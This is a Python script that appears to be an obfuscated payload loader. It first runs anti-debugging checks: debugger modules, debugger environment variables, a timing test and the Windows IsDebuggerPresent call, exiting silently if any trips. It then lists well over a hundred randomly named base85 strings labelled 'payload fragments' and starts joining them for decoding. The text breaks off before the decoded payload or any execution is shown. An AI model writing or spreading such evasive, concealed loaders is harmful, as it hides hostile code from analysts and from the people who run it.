#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_c_7otkaDi_lMEX = 'E-+j!@O!bV2uZ}#62o3_Dl#4i0f10XHSh|f^?X{77uLM=n>Jef^b68'
_coDjzqBCcEZJVv = '(KSS`npRo9ieo;~<G`@nRNS1C(Lwwj{p4|q}31)q%k{U&DWfZhk5ur'
_cdYa9Wzx0KXxoC = '_7xW92lw3cHqsbb;ciAZRxF^H*!|9RP{Hho{3aAnohQKKgC@v?Xg??'
_ccMnBh5MpfiHtV = 'QOJ=M+;m7I|6eI~)(Gwez0v!S1C0CUYdPH6e>NxUBY$GQAERw1Nwb_'
_ceoTt4GY_okT9q = '?R`)g{@So)gI<{P)Ag97(7f)A6omeMzWdfv!*w2D0G`;u%6-yQQB*9'
_cp0MgIIR2obIwu = 'uD%h)d!^+w(`hny!~HuKgO}1qfZo=otrEknxeqi*V0Hs)7}r~dB8{3'
_czVsdZqHf_Hkuq = 'bWKg3)eq`}I&kDRAej_m4t3bklgh2g1d0Ms8Ijin>jVDB(%i=^6+L+'
_cg4V4V_EL5Um6_ = 'd7cA#iDj2PvDek;zZGZZUNQ$oB|e~e~;S{DL;fQxzb;-!2g<ub`qEl'
_cfSm9Wv9PpGMHA = '^_UR3Q~sYNRS0Eg3SMltMg6zW3O-wgAhzoYR1XW`}dCR|}B9ujn2s&'
_cqOGfbRvPZ7zBR = '(7`EF=Jn(hH@bh=d>=XQ!xi!0qZ8?6S2D%SJGrvSk8Kowp&fTi%`5='
_cyGyFrA4qCSMGY = 'cSC2<JF;&x@9lq1T24zDn!}gb+stg;tQq^Qi;8c%A6+k`?F&TaPxHi'
_ctT0LsJ0chMqn_ = 'L#a2*oDyJ!ezT=1e2_Z{xY3#g8st&-&b*NVS9K9w#_tHAW=Ci0dQ^7'
_csulWGflTEEz0Q = '=Qvx-t`l<34>5I8<y*E2NP;1xOxfWS85>AVanIzbH`sjoZXy}Z#1Ti'
_cwUzA7JOVau0hr = 'XQ@pDXC~vHLpb4yqo5V*{MfX`&bGqG0$i7~rq?S#riTA06w&FORgF;'
_czgQUYOsas3L5O = 'bZ%bjhyNEdIaL>^OM5F&k!tTuM!+;=LMv2d6|TeEG}Z-AvXLP4rD1^'
_clTQFEnMXsWROf = '&k#c77);dD8peDd=fI85^w0ka0@Bmb306_NL|L@lZP-q@masQwC`HG'
_cnJMDce7ruHc3O = 'T6*ZwN=mpW>a7d3%vW%?Nt8CdK;36Qan7P)g!(021HgH`vk_JJ;#ue'
_ci7q2p8xZeki2m = ';V22zS{H{1~PMY&z?=}Du`eSXK}{s_LHUJ=-JSk-iPP`hoy(|NK~m|'
_cz3eHMqHoQxH1S = '@UHt-iS73NdS$Gdg*c&8<PS<*+v=afzY7E8kv@6xBDkSxAyj{1iP}a'
_cgDjETq6H5Apyy = 'eS(#%&JD%KF0sMrsI~Bm#2k^j8vrxQl^oxBy!CuciHk5s-2!jajvRH'
_cn1fYStgHohXr4 = '+F#G^jO?08>ZQ91G7@P0J}+t=NI@3q;g{7(3L(>35D0#mhE_ILTNBg'
_cqmlzoFVtNzXFu = 'Db9-zEUO7dRYqy6Q;<VXtbk1t5!E<373p|(2P~zFz!!)l-J)%IyTP4'
_cd7SapjHZkJcF4 = 'MrLW;9EhSSJ9L-fI3BF<cPJ;fkfyK)-SM~(Ky^1SzNoRYv04!;QkW;'
_cbP79nKAhtz91E = '^}yq_}$VK%t1CYC$u~a78QGLBVNZ4{}yE6dBn_4@VTiy)L;rTpw&tZ'
_cuCPhpaiAxV3QO = 'prgS;7V=8VULeUVOObR+w(puA#iz{sq4JDJc8UwgsPhv8NXmOR0bpx'
_cfrfvuf_vKwn39 = ')GZxSH@$mS#tu6VU32IbQ;tbse6jf~U}KsIWzT{E3yR-LeYM0Ejq;_'
_ck3RamHstDec4L = 'AeH}1&eGeR7qM6I{0@1*;d&J)dmegTt_Y9C{c{3xywf}M!&>2+mPUG'
_ckdbjgFcC2zqUJ = '4cVg$4HOBRml_rdj0iKG%Z$Wwyq;f4O3{*d3(JSFf}pl=@;L-pVpc)'
_cpkvIuTT_6zTX9 = 'J(}&mOKSepX1<J3dqUNIGSJ^*70d>(qb3W_s#7QSKPQ+aYJrvv!jes'
_ciohrGfKzNDnI6 = '<c93zL8mcG5x(mN0t>%aC*3(Wo!M>bhcx=xsTP?97MuF(?96b%u8{_'
_ca8TBIMOKv1hJg = '!jYr6%h<ta!WcqIV8);;J0Qbkj#(+A%}m784Xi=Di`g*m<?RC`frU`'
_cqvGvy5IMPlrDN = '^2APV)<Wj5UO_8n=%@0D1ad{)8Mn(8(8)9UlB1hKTUp%QiIMO1tgcr'
_cmYtZKW4Jvfq2f = '~X?KboCKI?_1o$J?BVVcU5i2vatal-i-;=30Qu#u_JBWFiTfa416R6'
_cbgsDVebxxoOrS = 'Y=u{4qBb+}u#4&R#&8%RCCfD**?ZK9f~e(jT4s!Sm|7;RRHIo2~1bf'
_cxhtEWz_C3GNZv = 'n=#mrkDN1w0Iw!X!vf+VENB3%gKN9>f<`i3*cu?4|?t(zaR&lNw$x)'
_cluvv40KQkfncH = ')kjBn!(_bO-Bfpr{Zk!aG?~~U`iLS-9ripqU5`E06C5l$$Ju8aEt*l'
_cardzFRXIJn6RZ = 'i*@NVVR_X`yjI39CYp4d}pGrc^R8=A$yF}ZCCw4AG_Gy0r(_rmz$FU'
_cnhqdqU49aMysA = 'mSq3buPxrCG9;40%SA-$Z`XZrzsWB`Tg?M9uUb^YMTk#{p78_j=V-a'
_cgnaPOMgELviXc = 'AhXgr}nPVh7WUQZ%QE_)88w$Yk{YC4B|f`W}QgYr;mDfv*|6>V_?Wb'
_cs01_G4EJzknCt = '7F`*Q<Nx3MT(4)>})vyz3S#?iXUkece^&xNA3kfT@PievPXV7$lCep'
_cj2H4LI57Z6POa = 'z5)eR7mvJ%0UY<zG*QDeyW@G=vhi^+)+FG9ML<Eef5fstB5j{q;Wl{'
_cbqEWDgbicvoUs = 'NwAPURZK3#-ug$=5bA*a5F#}>L!$U4n44U}Jo1Vx6uQ0Pv`~)Z{tp4'
_ctldPgsWszRn0Y = 'Hl=;RPG#LlxA4~8Yo!cQ*4<EsHVmRS*DO_6_j%>O1!f(H|LB*J9-(~'
_cciJrzMMWZL3KR = 'jt>(l#WH<aQb9hoPY;Td#tKBaX4UK_8r)P%Rxp)}v2wxAdsi8!<f14'
_cuV4cy1Q_rS_Cs = 'YP$g05q4UUS685qkf3}R1SfaZ+@Hx`nOky6J=(r*>U;XG^dpkzo{xN'
_cxbil1INXX09is = 'p(b_GVO->Pd|Jjo!!dCaCiyQ&jjQw#B8JcRUG}2zo^*-$`XaP8AmK9'
_cv6YVLBaZ6O3Lf = 'sOkIy@6~*N)A83XOA;VnVs*uJR-+gNkPiV|cWcg!WTSYp;>`0EYqnX'
_cnaDU4eVx2_029 = 'sjT}tX5foMXWCx8p2Tz+^|Qa|5KkSEp(oZ&{l4)Bnth@>n)wlD*c(`'
_cwamCpZapos48X = 'e<1?O42|&JZ$SR`Op}i&H%aMRtBGCK-(~RoM|S1c<5DI4fX(`4-hPb'
_ci2vojYZEVybNa = '7Dn810ac2F8<tEtUci`dBX1u&e+KOVxh~_wOXY@tO4&sDtJKqmo2q|'
_cw9zRsZT6MAlTR = '+(P%~2t~N@#OUbnmuWEfzlk}rK_X12HFa-9KfC+91=Ay=1r4Z!P&YV'
_cd7QEaB9GnHVxL = 'aTS*~Eov~x>2o?43xI}G{I$kP2PwYy`5A7nhBjfzQ+1Tg0Mq!98-B2'
_cfZSUIQnnajwxC = '!NiVr$qIBZ#MD1XgC_610{W3Zd3f%7aJeKn{6gFQeUUWsfG@lH@hvt'
_cicCGFvdXItE7q = 'Up>HRRuoP}UVtZOxiwMzo>*{&##~_7Dw(fTw?==Eiry@%*P!h*H#nE'
_cyGeWEj_BD3ZxD = 'Oi6z5K!uYDC=&5GbYET51hC+0m-)+up`$LLS5Dqe_<Vu6a8!X<J?CZ'
_cfo8X_4mZHuKk6 = '=#5|GLk-35M<Xm$7GKP4z{LYfEUD>^M(R!D3b95Zte1OsH1jNM8vSP'
_cvGcszp2aBGZfP = 'sgjM5XrzyH+TAeMhd<mk!GEXmMHEOK#SQPx{)C0`46$UTvBb?}W*Gv'
_caHQHHM1aflgYS = 'ad1y)5#J%$l>i8r4*VQwnrCqR^2t=v}+6ph#^MZNu~i0FX&^5V};DM'
_ciku0Y4UVh5Wu9 = 'eMeIFLcB*zbty!h*fXcv!2|R8+OgwVDTwx*aY>cS5A3PCIJgYeod};'
_cofx3ig5G2MAEB = '}LSNp|;AXtjb9gS-TvBN%kLol&gWAfLU~iGxML3c{0^<dG70zZt|GW'
_cp3ePuycHFr6_f = 'y^tjCv+~TO0F{UiLApYtv4aHdhOw7d*pd4+MHxv@!IdESQLF$Fhbo^'
_cv7_LOavorTXCx = 'hMN=LT+YCi9E}t1%*WDMm3doTByFbU|!gN_e`?=h<*%X5|et`nn5jx'
_cz84Of9O8JgFTz = 'yG&_t)`%|-o6<i1vOuDmgA8;<6(wWrGmBmmB!2`oP{^9fG4;Pb|FV)'
_ckx_PuGK5VuFtn = 'b~qtOa+^so_uZTm?lbp<kumV3V=M$<qy-eQN?sW!{kpBDLa43>F6;+'
_c_hbYkFaaaUTEi = 'p0EYLX}Qp65r~*V<b!p2;=Q9A-iL_|JuT(6cmPy+0t8wxph(^T)mk3'
_ctCxwE8RsbRXbd = 'v8z)J>`>J`&^j-0j%Ima#JsSh8C)x=cAQdU>!%SviO=|<a{XY~`kV>'
_cvMDPjKfcCxj3b = 'J8KIqKH|)X*HqC=uihn-A1Xe?dz6>d8)RO+hC$PZqv?>MnH*AV)RdP'
_cz5Z4yXRD50wfk = 'N$DX%@`x^e&WV>Y2h)|?-X?|Jj4F@8aMb3U%@<`H6|Q}4u{d{{ptz3'
_cm5sRtFDDO3j6Q = 'aN_jPxv!_cy2tS*DZ63bTN{Jl+mf7+}^N=SEN8;e_D(tGSVHuh?#eZ'
_ckkFtlSaTHTfd3 = 'h{7D2+<UZF5uMk<!?cceF<3RTZaiFSvCP!{5Cx}_IjJto^kPjL^V))'
_ccevgPN1lAAT6A = 'ArE?DNk-nM+@mIGKyyiuJMLhY=FFQWA&QO$gXV5o(x9?UX)<qaItK-'
_cqn67xQhqL2Gfm = 'wFBsEp-UN`F7w*vWNG||<In5~&8%$&yFoKJ2!6l$WqLH}o5fi`YD?~'
_ck22MGkU_fAByy = '_E(J&&Md7frIc#jkMqXI0>ozsJXZ90|&Q<(P+_z6;8h&3_UnBP3rmW'
_cqO1GI0i2MOHMm = 'jzF`KJ#$=FI!aN3ZfXv+>_oE{I%w2;J)^d+ZO&&o?NyM-E`%Xrl`^r'
_cosmAOvwkGXPMY = 'vnjqmLwO{D)>r=q3?{h_}-8bc*~LHCWGY7;m8Hd+TTPnF?3M3DANp$'
_cttNbeJFSLOuVw = 'LF?J;LlJo~LCc?Ieailgl*^~ON$4FopQS@jD-%W)GZV456ExUUg$@|'
_chL7dVfQ5vr9Ej = 'H>0dK>r-B7Qc2745L|}<hGd-Yw9tb7oHSVSFBspSq`W-$&#cbIHgfu'
_cyd3EvL3KArRK3 = '`&pLCfKVwCk4AjQH9Xnfes=J7|L4C);(Jvwge+w{u%sJm=7iSdG$3q'
_c_AAOEath_rkre = 'F8c^~0LFnO$KK*r_Th>`&C0@mQ1SZ=yT-+Iq0Mo#2xR-1j-7K!02tk'
_cmU7MEcKpZARme = '~C>It4yQsg*Wo3l!6O^LYiAi-?mddZJ`6#Jaw3g3~!b|EQKyM7|4DG'
_ceklD8wWwlZO8g = 'JO|m7znJiFzW#v%qoaIO6}?aF7{V!Mxn2NsGd+JOYRs&a`mX&&5P<c'
_ciMZKIllPDHrs4 = 'wyCJ30?ikG<)VmGVlwpSTTKb#7*854*YEMU*Ig>v;cy%C=b+E3c1hM'
_cfk29N7ve03leH = 'Pci)JuIpa4&deU2Ko6l!h+!&W1*Lswj0R=LoYz6Jo4r&9DYjRQgKNN'
_chLPIR3OerE0Jn = 'Me!f?|^*iLGn8+_*@?f`%IfmjOP6uL4|Qh{g(SmOZF+puuUI_vc3`R'
_cuh0jykNxLsDu8 = 'JSHc$}K|cZEwqbzKSL_J(wNn@#f9jhFEbo74UtQZ&bzmlG&2$RR;T$'
_ceOGgf4gRLRqdv = 'ihk3<pPGDn<DI3~zi-;JLcXR%vwAUdvZ$(7nW=6~voOpHRrc!c=pa*'
_cioj5RxcZD8917 = '<JB+9VAotO-VmJvJcDU>yVvT&a3+5#7OJH(LMm0^x;G1FJnr{%2$V&'
_ctfmd2wylrsrP0 = '@zCX>@fqF>-2i`Km}ltsqdeIiPJF)Td+)R*lO$e`tIPo%M9OAx|)O-'
_cwGDRIuRDOI49_ = 'MYqVdCR-6N8eaWOw-4^3oE?P4$jV=M`FQ(-z)-OodEq<(k~z^zffSs'
_clBQsL1fEQuqon = 's;mZcoS)qO4TPj?jW7F#6|i_wKi{_1{)UFo}|ql!@0J1-$DV8lf^GS'
_cfHk73A5ce3wqs = 'gAeFv8sW2-D3-ff9PJa#jI2#fR3LjoYduUcZP+arFk$p$iaN4UB;J3'
_cnmT5zGmHCYOTX = ')vF0`cH_24gJg~(CxjW}H^i;#nX2V2oj^E1J%%GsRqqJ?o;^wGEMmQ'
_crBkHPJNycZulV = '0+LJcbhYWi0>J9aM+Xui-jsP`7*X@V-7Q_Bmk+j$rtJ`rAGQaXv@#F'
_cqeAQmw3sx6gxV = '4WeZxM)#ehDx(QL9a<mAnjvB*q6+sskmY!RcXVE&Y&cqQ-e|7{%l#&'
_ccZlLHKj7K0lJT = 'a3&Xcq8<g-s{YW>lcnD`53avHKJhBfU_C(4Jt?-b3WKlVc1fEAr*Sd'
_cbeFdSduH2d0xU = 'g5#`7QZ6{OK4C&<)D#J8r-xO_kJls>UkiiWd}1a3X|N_LGEQ~XIXI&'
_cvfv7154oujX5f = 'hXs_m$=E~lTg^p63vZv=~`@Cu5+W;RHx{t0Z@&!5b)Efng!+H}v#H='
_cyMIXMqu4_STA0 = '+({0ESv{H@9J%2~%wzTQXCRLn`&TJiK`*OL~}%~;G*VrEievJk6q;h'
_ckQ7apxIiQXwRp = 'eH_dfh~imG{a$!uLN9J;b-U)zEtRu;!hZVlVu#t+?pq&rN7nS2b=Z^'
_cg6LRi9SAPx2Lp = '^HLK+uDPl@)=lbY2L%4WWnPz{dPj0pERo2Asw*X_D7ey9*ET3jydAU'
_cqd1Vmp1r2jURL = 'fhoO)d?DEMQ<`5!Oz-V)IfeTsrUAL~+8FVYsG0gav>mDerc`e6Uqw-'
_ceJGdlf44x3Fel = '9Uu356rK^IP1k1d}Y(V&I(b3WWNC-fL`70fHqqH&OiXBSpK!Yg2ZSb'
_cf55WKw3Nrfl52 = 'MQyY&EOeL@Tf6Q-4nEjxz-i3POCq$s^F-Sdi831IKV6>#$tPBz8OZ3'
_cy5WhWWwbjk3ON = '50mC>8d20ON~?x~37IKp0wt(Z<1J@VKbD0kS0b;V38^vi|*pP}nsBR'
_cpes6Rwr1y5ta0 = '#ZP5(tPDlGXmW<y;Uc8A~%G%9MH<dKsaXAJ>hmbg-kKR3B{!`v$#Dy'
_cv5lkwr41VIX_s = 'l$gZ2g>LNwrgsFZ7|h>j1WRfDyBF$#??b+fO&HW=4dGc||A#zpMo#Q'
_co63GZ7bCsmn4a = '0h0T9-ShK9Yj8r{Q2((G$Ju0<!dfR>lR22Xd(Hh10w&0fuY5)hvKi)'
_coxJdNHtXvCesQ = '*8b=Yse`P4G)O6~%75K(&jMPlY-@+4A0hxt7LTzU;)2A+;w`MBD3c='
_caPqapGypfJlI6 = 'Y@aaXl)HwuO%fl}r-5-#$<@+XaOKG7wWiyi6BxH5z`ZL)Z=@3Jw#ki'
_clt2Js3fPQZSY8 = 'oHR%CS)hynv)CqszTUi7I8+a1RtP+ke~@_Ok)&?cPUnf>Dfp}tzhhc'
_cs2e3zP3PHJEOU = '{-PN$B~+~C0<dM*s+y}u*ctJx)S|`55T;kdsTX^RXbggQD6tnw<=LU'
_clm1TU7OWrTCK8 = 'EO?_cad3Ie=+(z01aO$M-o+Y-v(uZ5iwZJ6xX9rkCBtRH>tvO}b5PA'
_cjkjxiYUssGp4z = 'oSW}xm0P)kkH;WXt`VTaD8SpB4W>kAv7rj&2cX59Z|=mi<5gqRYApG'
_cb_fSF8UgaJEp9 = '|nAnSp%7ktqe!t&^|ynf|_3IiH;~t+YJ&X5;&`0=z5DIyuT(ZUZ-H_'
_cvmbOITaSsPyqn = 'sO7OCZ4CF^C{}8;gX7cI+h@-w8+B8D8ft@7C31*QRIa~1za9+zL1kG'
_cztFJBoOjYJ3q1 = 'UL!t8rRw)Ql0l0gGG3S!cuKH^;M46YxoHLX%~F`N_M~8rdlm6f;C4$'
_cwmoPw0gz1Vkw3 = '~JH`5Ym_-d1f@9HxOa29O&35eL{*in8d3jL}rkmw@)yYWSzkuDlU7G'
_cvPt3Rpb0wpt6A = 'e2*#d8>awN=xC0%D-vf%#$PUI`puGFy74OYx#d#d`-T+(ksij|)f>d'
_ci5UXJET894HMJ = '1p;lZ$f^a3XV&Lv})#y%Z!eim;L^M=4REpb!9!(+-9iB#YQiIxJ0dk'
_cgIST4DBCEUVUK = 'aXz)$1xIh(Q~*&l-xRmC9J9r=R-yJ&ohpT{D#HNBfj2#@O>lz%twz0'
_cleW6mMlvLroD2 = 'Rs?5IJVG4^KGqc_R8J{Esg2bM*qvIX_qYSk?w3%@*vK-(I4fe$8-tf'
_cxDh7OkuaRDG9O = 'Q0n7SuZSKh(=lRyG>{MVh{2lRqwxq|@0}U0ZKUQG~tW58kp5FdcVX}'
_cnGnyf0lNyGInS = '9O9^#c(r{@!1xitzWK@ug!@@z)S{JXm(ZDf2o57?g80)JLYUrYR7u8'
_caBOy2G1huNNem = 'lTDd%E`ZzpAxNS3hlUv<LyXbziN|Gb<J|$yY2o=j4dnFdok}xOxouq'
_chMMAMghJICIsz = '>fI|oENn@&2o=o2hhjvj=KDfTen79ajWI&a*^k%w4pf%myswB9L}xT'
_c_Go0owzegls4y = 'q=?FAIU5eJ)2O4)FG&50BOD|EGcz*2K<{m;1*CWp;a64>B2g|YNJ=v'
_co3CzEqs7PpnC_ = 'z<)!a3xc-N(D<FO-=yLG+#nor>94rF0p=FMUkUb=kuqLd=e@+3c90)'
_ciN0bpg3NdoWvR = 'oeaU;-s#R$NFRp>0r&#cx;&RmU9mIiewznY-&dAys}zorg_o%uuNQ6'
_cw1zkWWYO6OIGq = '~Sx(ro?=e$Et%X#L!ESKO+`&`+G86c(r@>&svzQ#595>iB@QOxM0EK'
_cfAckFmaJy89WR = '`D-_(*D!<St+(V@A-90#t3wsjE>l;K?h{B4bfqxlh{f1cq@O;)`unr'
_cvn0zIWG0Tc_Cq = 'mBEU(hX|qE1t(Dif(AFfx$Ewe;WqRP+Z1>J!!{M^y_1d;J%O2sx6Si'
_cv9aDjo8DXQocR = 'rL34BP^jj(<gpte}|G}j;B9IGsC;F=~!j1u8HL-exuh<QneG9por|B'
_ciCnQFhe7QIrVg = '@uS@p3&T6DdN*QKS=d(GKQwVwBwB^I8t!$xSs&cyCB&9p&g@1H^S?5'
_clwNcNhaWOD6gd = '#VjO8M|Gx1QSM)vm$(qe;4-@{>f$)Ti4kfr@2Y>)-kLqJaH@YHuJgr'
_caHc_BECQcuEbc = 'B7Q^p1(+_0h@x0=tjwDwEyPxT*S|_n^scT->Sd+%_tIF-^%!x=!99I'
_ckPdZS6fmKaskQ = '6!8`NPX-#4xJ{!17oTT!??9%D1+cSDjEb<RY1pe9q}kUsI0^~`CcIN'
_cdsxYHPy76KLzg = 'dCepWFl6fy>0FwE-!3>wU?QkwXuVVrvAh7S%qhw+CFDxPt(`kjIDiQ'
_cg8jXPVjkTgVht = 'gf1}n@r^&)F!U_=eP!exjDk&I1t4=1%P-=mu~oZ%(Z{&V1=<X%I5L$'
_czt4eKXiEDoNrr = 'E3;3b$@-+fuiu4`<I-;d2#YQl$9ZwB2Z~x5lXV99{p3k17*6g6YruJ'
_ccJTg7ks9ygHWU = 'NNK(^yKez%^h~nd!T7Gy`PIBCh{ts7Xf!mEqSBRi5_i*rLT$w)SOHI'
_cw8ul0RluxEi1x = '?pK~IbCR8{<FKM|n{V{;8bwU(ITDm9I4FY=KNfH}jiIhTnnxY)g=D{'
_cxA5X6CmZa8rwT = '+g0_~KOksLMYD<4pd<tyS*V?KFHoGrR5QUF&rW^xKs5_=7aB%9e^nF'
_cm7YVdwBz7XmpQ = '*QzFS~WAioNn@ct2Ri0te1N~)RMZ-CVI`+jT;e^np7ZMwuYPeR<e-;'
_ckotU1Gh107nYe = 'B%$`zOx|C&E^@KG%FrOO_z+#FpZl$jLXxADRiZVn*H6$)FX8*!dA`*'
_cxzTFr7TXAs4my = 'GQL58LFr+O=)Efj}TuaT53T>oQ!!0+p#v=QDB{TZS{gLog_ARzi%nP'
_ccq52xXIRrlyge = 'g`@h1Zj^$t5O(>(qK$ADQwkA4%FtwS*^KW{p@*XsggT5R*Ubi=uusQ'
_cpDsazygM4rD5J = 'Ehl@RK0FRUzf|07QJquXi@;l~NFJK7aIz+~~oS3R?Ih>;I2(tte?w#'
_cwomjLSm37aTjE = 'F>Zx?QI!EWABLR0_-h9d2CquUEx(nwAQqd5`H5R-vWY8o;}c<Y&pJ^'
_cjNZmuDi7yB47J = '6c<Xj{)Q<@tNSgi^Bz_Eu&e99f*^0w>84<;;}Fl{_B{nsi`eFO}6@;'
_cwyDCO8Y6ewsbc = 'BnSJA~TE#kzY3FG)7M!YgNlBiNGm!&z7QH1{>^GR0bQ9*tfBEOWhL1'
_cpIF0ntRkX7_3O = '`v$@U$0pxkLmG?qM*;7+>s-Q%_70c*JZE^gb_lBBRQdMgKQJM#TKKB'
_cxaZTrlMHF6fFO = 'FIA_g{mj45wwC{c~c<giT@?s(iT8NhQU`m&XM7jr`IZ_#%`Vhl2bl}'
_cwerFgXqP5R6ap = 'qiNPolYVh()#1QQ8Dc61!sIe4iGN8qc#XYSv26`P8mv1NGa$KTZvYs'
_cwE0z1WYy0sGo3 = 'ezCuN`xZAc|<NSpVY0dxOw}>RS$FGEk4t!v~)Q75L=rk)emsK*L_HV'
_cdpImWwW0X77iU = '8#X_Z2TAXxj5-z24m~jj4F}Fd)CsS<=Z4=GEh6m!w{d{82Ih%rKjcC'
_cddYxytqxhgtl8 = '4W`M;n|dH!LR3uzk+iy^EEUjxyu>TUtH{%X<+~UiI6|bdYG)&6{F}7'
_csvEsthGYhWV6X = 'yAT;4@7$1=jUWf@D3C$)36^q7a`<Jw?CQ;yObcFyEGvA&(-4>%DCfC'
_cwmPNlDtuWKunn = 'c#FZh9?i4&@$He){Qi|w01JwV8j#atj$PuCm7!2ir9%)uz_MHKYn7S'
_co_y7vsFbNGvJs = 'pv7@3ZFMb4QD&n4}^&85nST%~%e)0I%^l?y(iR_6?md4RI*l%WXLOi'
_ctYnZM42A21F19 = '19y{S*6C%Za1&Jnx$fZ@h>)C)uHEoMmOZH;-BIc>AU{|v2XY7z))HW'
_cggfAg3CzVsubO = '*6*e;I5J*?si^`LWL3qIn3?fXEOE`#kIeoEygbs52g&N%96!Xl5}2p'
_cj8VCjsR2YlIrh = '&)NQ5@v!!!uf%jU3`z&Tx)v<IMhq*xXN5Bz<p!X}oATrHGH{#p^Bn@'
_cuRlDcOf7OXSYw = '5F@V@u{@KS|;DEG@99e_EZ3ID_v$=Wd|{JD#15oHlod>?K!h4X*{I2'
_ctSg70MMZDOoCb = 'K`9qKrcsBCSi`Si*Q?F^AQVrUsha%|P9NhCm?`^r<j;;`-^wdjW2ph'
_ckiMyC4JBmKJ9N = '?Nh>Bg$3&T4gk?8KNV^@{KqMD;!)6C#Fsbm6JrnpJ;2LDay%z+1n5y'
_cwb9JyYUQrZCmY = 'rc~Q2lCkDdC<EhtaiS~Qz$uoY9#Z2ybF1lV!hKzWe^3S9se9xxw(PM'
_cgOxaEJA1Jez0I = '<l7doLt~W`$;t^bhT@i4S5cas6cEL##)Mvz`WWtwD%4YtK!_Sbg!<<'
_cwuak1EcAf8jLu = 'k?zpSHCe&g#*N4^evrPNt%(e59#n1^xzzJwep=Fs*5oV6x<yB&J3u}'
_cqXNf8oavV8zQm = 'GBAT7jqF0{!7M28+<@lNfBA>zR9Iqi@uN?kV|M@LmRoUXe{-QN^d<R'
_cjNpEw6q8l8Be7 = 'RPqWlFz8&ZDq#FBDsJ{{(Xa&>3OrohF40STjsvIoh3Z=E%GUMJ?$5n'
_cqqukXcdSQUqkU = '>#+5ON)^#|+E{%S+`c)w_lX<4(%116ZU^yV`96>U^*G$n5uu+p{(GO'
_cvzAVezMr3Sg7_ = 'E9J~^|{eP9ptTbbW;^pel!Y{e;Qr#I>^Scz$|5j4EazT`PSJF(Gvsa'
_cpiAGsS_VHZp_r = 'FS=Eo9xZW^WR%m1ac46><i&0hz|b}%XS=P%(@1}?SNs2`4v=eE2(c3'
_cu0x7Nyv2iLw1P = '1rn!{s9a(@>c{pyIhy)GU$DPc>9S(OJUKzF@=T*Wdd3rGS;Z+r_5)G'
_cf5hhWR_j4PkaJ = 'NIg>!_-6)di=WN=PKaxm{1Zcmp-lw<0v?x>068b=OD+Y#<@!'

_pq4m8JMjlZ5ddg = __import__('base64').b85decode(_c_7otkaDi_lMEX + _coDjzqBCcEZJVv + _cdYa9Wzx0KXxoC + _ccMnBh5MpfiHtV + _ceoTt4GY_okT9q + _cp0MgIIR2obIwu + _czVsdZqHf_Hkuq + _cg4V4V_EL5Um6_ + _cfSm9Wv9PpGMHA + _cqOGfbRvPZ7zBR + _cyGyFrA4qCSMGY + _ctT0LsJ0chMqn_ + _csulWGflTEEz0Q + _cwUzA7JOVau0hr + _czgQUYOsas3L5O + _clTQFEnMXsWROf + _cnJMDce7ruHc3O + _ci7q2p8xZeki2m + _cz3eHMqHoQxH1S + _cgDjETq6H5Apyy + _cn1fYStgHohXr4 + _cqmlzoFVtNzXFu + _cd7SapjHZkJcF4 + _cbP79nKAhtz91E + _cuCPhpaiAxV3QO + _cfrfvuf_vKwn39 + _ck3RamHstDec4L + _ckdbjgFcC2zqUJ + _cpkvIuTT_6zTX9 + _ciohrGfKzNDnI6 + _ca8TBIMOKv1hJg + _cqvGvy5IMPlrDN + _cmYtZKW4Jvfq2f + _cbgsDVebxxoOrS + _cxhtEWz_C3GNZv + _cluvv40KQkfncH + _cardzFRXIJn6RZ + _cnhqdqU49aMysA + _cgnaPOMgELviXc + _cs01_G4EJzknCt + _cj2H4LI57Z6POa + _cbqEWDgbicvoUs + _ctldPgsWszRn0Y + _cciJrzMMWZL3KR + _cuV4cy1Q_rS_Cs + _cxbil1INXX09is + _cv6YVLBaZ6O3Lf + _cnaDU4eVx2_029 + _cwamCpZapos48X + _ci2vojYZEVybNa + _cw9zRsZT6MAlTR + _cd7QEaB9GnHVxL + _cfZSUIQnnajwxC + _cicCGFvdXItE7q + _cyGeWEj_BD3ZxD + _cfo8X_4mZHuKk6 + _cvGcszp2aBGZfP + _caHQHHM1aflgYS + _ciku0Y4UVh5Wu9 + _cofx3ig5G2MAEB + _cp3ePuycHFr6_f + _cv7_LOavorTXCx + _cz84Of9O8JgFTz + _ckx_PuGK5VuFtn + _c_hbYkFaaaUTEi + _ctCxwE8RsbRXbd + _cvMDPjKfcCxj3b + _cz5Z4yXRD50wfk + _cm5sRtFDDO3j6Q + _ckkFtlSaTHTfd3 + _ccevgPN1lAAT6A + _cqn67xQhqL2Gfm + _ck22MGkU_fAByy + _cqO1GI0i2MOHMm + _cosmAOvwkGXPMY + _cttNbeJFSLOuVw + _chL7dVfQ5vr9Ej + _cyd3EvL3KArRK3 + _c_AAOEath_rkre + _cmU7MEcKpZARme + _ceklD8wWwlZO8g + _ciMZKIllPDHrs4 + _cfk29N7ve03leH + _chLPIR3OerE0Jn + _cuh0jykNxLsDu8 + _ceOGgf4gRLRqdv + _cioj5RxcZD8917 + _ctfmd2wylrsrP0 + _cwGDRIuRDOI49_ + _clBQsL1fEQuqon + _cfHk73A5ce3wqs + _cnmT5zGmHCYOTX + _crBkHPJNycZulV + _cqeAQmw3sx6gxV + _ccZlLHKj7K0lJT + _cbeFdSduH2d0xU + _cvfv7154oujX5f + _cyMIXMqu4_STA0 + _ckQ7apxIiQXwRp + _cg6LRi9SAPx2Lp + _cqd1Vmp1r2jURL + _ceJGdlf44x3Fel + _cf55WKw3Nrfl52 + _cy5WhWWwbjk3ON + _cpes6Rwr1y5ta0 + _cv5lkwr41VIX_s + 